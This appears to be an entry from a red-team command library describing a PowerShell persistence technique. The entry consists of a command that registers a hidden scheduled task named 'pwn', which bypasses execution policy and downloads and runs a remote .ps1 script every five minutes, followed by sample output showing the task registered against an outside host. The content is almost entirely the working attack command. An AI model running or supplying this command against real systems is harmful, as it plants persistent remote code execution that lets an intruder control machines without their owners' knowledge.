---
id: af70c197-19d7-4d58-b5d0-90740b7372da
name: PowerShell Scheduled Task Repeating Every 5 Minutes
type: command
executor: powershell
data: '$action = New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument "-ep
  bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString(''http://$_TARGET_IP/$_SCRIPT.ps1'')"

  $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan
  -Minutes 5)

  Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description
  "pwn"'
output: 'PS C:\ > $action = New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument
  "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString(''http://10.10.10.100/shell.ps1'')"

  >> $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval
  (New-TimeSpan -Minutes 5)

  >> Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description
  "pwn"

  TaskPath                                       TaskName                          State

  --------                                       --------                          -----

  \                                              pwn                               Ready

  '
created_at: '2020-03-13T01:36:22.738585+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PowerShell Scheduled Task Repeating Every 5 Minutes

```powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
```

## Expected Output

```
PS C:\ > $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).downloadString('http://10.10.10.100/shell.ps1')"
>> $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
>> Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              pwn                               Ready

```
